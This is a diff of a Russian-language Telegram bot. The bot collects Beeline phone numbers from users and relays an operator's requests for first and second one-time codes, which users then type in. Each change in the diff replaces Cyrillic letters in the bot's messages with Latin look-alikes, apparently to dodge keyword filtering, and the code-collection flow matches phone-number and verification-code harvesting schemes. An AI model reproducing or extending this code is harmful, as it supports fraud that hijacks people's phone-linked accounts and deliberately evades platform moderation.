@@ -56,7 +56,7 @@ class AdminState(StatesGroup):
 # ===================== KEYBOARDS =====================
 main_kb = ReplyKeyboardMarkup(
     keyboard=[
-        [KeyboardButton(text="🐝 Сдать билайн")],
+        [KeyboardButton(text="🐝 Сдать білайn")],
         [KeyboardButton(text="🆘 Поддержка")]
     ],
     resize_keyboard=True
@@ -266,7 +266,7 @@ async def choose_sale_type(callback: types.CallbackQuery, state: FSMContext):
     )
     
     await callback.message.answer(
-        '<tg-emoji emoji-id="5467539229468793355">📞</tg-emoji> <b>Введите номер телефона:</b>',
+        '<tg-emoji emoji-id="5467539229468793355">📞</tg-emoji> <b>Введите номер теlефоnа:</b>',
         parse_mode="HTML",
         reply_markup=cancel_kb
     )
@@ -287,7 +287,7 @@ async def save_phone(message: types.Message, state: FSMContext):
     if not is_beeline_number(message.text):
         await message.answer(
             '<tg-emoji emoji-id="5465665476971471368">❌</tg-emoji> <b>Некорректный номер телефона!</b>\n\n'
-            "Пожалуйста, введите корректный номер оператора <b>Билайн</b> "
+            "Пожалуйста, введите корректный номер опеrаtора <b>Билайн</b> "
             "начинающийся с +7, 7 или 8 (например: <code>+79031234567</code>).",
             parse_mode="HTML"
         )
@@ -322,8 +322,8 @@ async def save_phone(message: types.Message, state: FSMContext):
 
     await state.clear()
     await message.answer(
-        '<tg-emoji emoji-id="5413482938585063042">👍</tg-emoji> <b>Номер принят.</b>\n\n'
-        "Ожидайте запроса кода от оператора",
+        '<tg-emoji emoji-id="5413482938585063042">👍</tg-emoji> <b>Ноmеr принят.</b>\n\n'
+        "Ожидайте запроса коdа от опеrаtора",
         parse_mode="HTML",
         reply_markup=main_kb
     )
@@ -337,8 +337,8 @@ async def request_code(callback: types.CallbackQuery):
     order["status"] = "waiting_code"
     await bot.send_message(
         order["user_id"],
-        '<tg-emoji emoji-id="5242628160297641831">🔔</tg-emoji> <b>Оператор запрашивает код!</b>\n\n'
-        "> Нажмите кнопку ниже и введите полученный код.",
+        '<tg-emoji emoji-id="5242628160297641831">🔔</tg-emoji> <b>Оператор запрашивает коd!</b>\n\n'
+        "> Нажмите кнопку ниже и введите полученный коd.",
         parse_mode="HTML",
         reply_markup=user_kb(order_id)
     )
@@ -350,7 +350,7 @@ async def enter_code(callback: types.CallbackQuery, state: FSMContext):
     await state.update_data(order_id=order_id)
     await state.set_state(UserState.code)
     await callback.message.answer(
-        '<tg-emoji emoji-id="5334882760735598374">📝</tg-emoji> <b>Введите код:</b>',
+        '<tg-emoji emoji-id="5334882760735598374">📝</tg-emoji> <b>Введите коd:</b>',
         parse_mode="HTML"
     )
     await callback.answer()
@@ -371,7 +371,7 @@ async def receive_code(message: types.Message, state: FSMContext):
     )
     order["status"] = "waiting_operator"
     await message.answer(
-        '<tg-emoji emoji-id="5427009714745517609">✅</tg-emoji> <b>Код отправлен, ожидайте запроса второго кода!</b>',
+        '<tg-emoji emoji-id="5427009714745517609">✅</tg-emoji> <b>Коd отправлен, ожидайте запроса второго коdа!</b>',
         parse_mode="HTML"
     )
     await state.clear()
